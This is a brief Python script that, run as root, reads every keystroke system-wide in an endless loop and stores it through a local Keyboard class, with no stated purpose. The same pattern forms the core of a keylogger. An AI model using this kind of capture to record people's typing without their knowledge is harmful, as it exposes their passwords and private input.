import os
from keys import Keyboard
try:
	import keyboard
except ImportError as err:
  raise Exception("[!] Modules not found. Please run 'pipenv sync'") from err

if os.getuid() != 0:
  raise Exception("[!] Please run as root.")

_keyboard = Keyboard()
while True:
	pressed_key = keyboard.read_key()
	if not keyboard.is_pressed(pressed_key):
		_keyboard.add(pressed_key)
